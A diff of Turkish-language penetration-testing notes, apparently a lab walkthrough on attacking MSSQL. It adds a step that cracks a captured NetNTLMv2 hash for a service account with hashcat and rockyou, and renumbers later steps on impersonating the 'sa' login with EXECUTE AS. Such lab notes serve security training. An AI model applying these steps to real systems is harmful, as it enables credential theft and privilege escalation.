@@ -375,7 +375,21 @@ impacket-smbserver share ./ -smb2support
 
 
 
-##### 4. Hashi Aldık  MSSQL ile Mevcut Kullanıcıların Kimliğine Bürünme `IMPERSONATE`
+##### 4. Hashi Aldık  Hashcat ile Kırmayı deneyin
+
+```bash
+echo 'mssqlsvc::WIN-02:5700434aa4a14e34:EABEC1730FCFED43B49E3D78778EE60F:010100000000000080225CDEDA72DD011E6EAFA06B0F731D0000000002000800560046005900500001001E00570049004E002D005000360059004A004100390044004600320052004F0004003400570049004E002D005000360059004A004100390044004600320052004F002E0056004600590050002E004C004F00430041004C000300140056004600590050002E004C004F00430041004C000500140056004600590050002E004C004F00430041004C000700080080225CDEDA72DD010600040002000000080030003000000000000000000000000030000064DD6D211D815D73B239C6FDDD505EA12A03B98AF51ECA1C541D19DF5CCF44B60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310032000000000000000000' > hash.txt
+
+```
+
+**sonra**
+
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+
+##### 5. Hashi Aldık  MSSQL ile Mevcut Kullanıcıların Kimliğine Bürünme `IMPERSONATE`
 
 **Kullanıcıyı Taklit Edebileceğimizi Belirleyin**
 
@@ -398,7 +412,7 @@ valentin
 
 **yukarıdaki çıktıda  `sa`, `ben` ve `valentin` Taklit etme iznini veren taraf;**
 
-##### 5. Mevcut Kullanıcımızı ve Rolümüzü Doğrulama
+##### 6. Mevcut Kullanıcımızı ve Rolümüzü Doğrulama
 
 ```sql
 SELECT SYSTEM_USER
@@ -417,7 +431,7 @@ julio
 **`0`** döndüğü için sistem **sysadmin rolüne sahip değil  ancak `sa` kullanıcısının kimliğine bürünebileceğimizi gösterir.**
 
 
-##### 6.  Şimdi `sa` kullanıcının kimliğine bürünelim ve aynı komutları çalıştıralım
+##### 7.  Şimdi `sa` kullanıcının kimliğine bürünelim ve aynı komutları çalıştıralım
 
 ```sql
 EXECUTE AS LOGIN = 'sa'
